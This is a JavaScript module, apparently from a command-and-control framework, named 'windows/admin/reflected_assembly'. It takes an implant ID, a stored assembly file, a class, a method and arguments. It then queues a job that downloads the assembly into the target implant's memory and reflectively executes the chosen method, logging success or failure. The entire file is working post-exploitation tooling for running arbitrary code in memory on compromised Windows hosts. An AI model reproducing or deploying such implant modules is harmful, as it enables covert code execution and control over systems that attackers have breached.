const moduleHelper = require("../../../src/moduleHelper");

// This function returns the module object to be loaded in the database 
exports.load = function (app) {
    var module = {
        name: "windows/admin/reflected_assembly",
        options: {
            implant:{
                value: "",
                required: true,
                description: "The ID of the implant"
            },
            file: {
                value: "",
                required: true,
                description: "The ID of a the assembly file to load"
            },
            class:{
                value: "",
                required: true,
                description: "The class to load"
            },
            method:{
                value: "",
                required: true,
                description: "The method to run"
            },
            arguments:{
                value: "",
                required: false,
                description: "Arguments in string array format or: MyString,[bool]true,[int]21"
            },
            cache:{
                value: "true",
                required: false,
                description: "Allow caching of assembly file"
            },
            arg_as_string_array:{
                value: "false",
                required: false,
                description: "Select if input arguments format is a string array or default (MyString,[bool]true,[int]21)"
            }

        },
        supportedOS: ["windows"],

        description: "Runs a method from a reflected assembly in the memory of the target implant",

        requiredPayloads: ["reflected_assembly"]
    }
    return module;
};

// This is the first function to be called when the module is run
exports.run = async function (app, run) {
    try{
        var file = await app.service("/files").get(run.options.file.value).catch(() => {});
        if (!file){
            moduleHelper.logError(app,run, "File not found");
            moduleHelper.fail(app,run);
            return;
        }
        var job = await moduleHelper.createJobWithPipe(app,run,"afterExecute",
            {
                type:"reflected_assembly", 
                options:
                {
                    length: file.length,
                    class: run.options.class.value,
                    method: run.options.method.value,
                    arguments: run.options.arguments.value,
                    cache: (run.options.cache.value.toLowerCase() == "true"),
                    file_id: file._id
                }
            },
            {type: "download",
                source: file._id, 
                length: file.length, 
                destination: "memory",
                implantId: run.options.implant.value
            }).catch(() => {});
        // Creating the job and setting the callback
        if(!job){
            moduleHelper.logError(app,run, "Error Creating reflected_assembly Job");
            moduleHelper.fail(app,run);
            return;
        }
        moduleHelper.logInfo(app,run, "Job submitted");
        moduleHelper.inProgress(app,run);
    }catch(err){
        console.log(err);
        moduleHelper.logError(app,run,err.message);
        moduleHelper.fail(app, run);
        return;
    }
};

// There are callback than can be executed once jobs are completed
exports.afterExecute = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(app,run, "Error during method: \r\n" + job.result);
        moduleHelper.fail(app,run);
    }else{
        moduleHelper.logSuccess(app,run, "Successfully executed method: \r\n" + job.result);
        moduleHelper.success(app,run);
    }

};
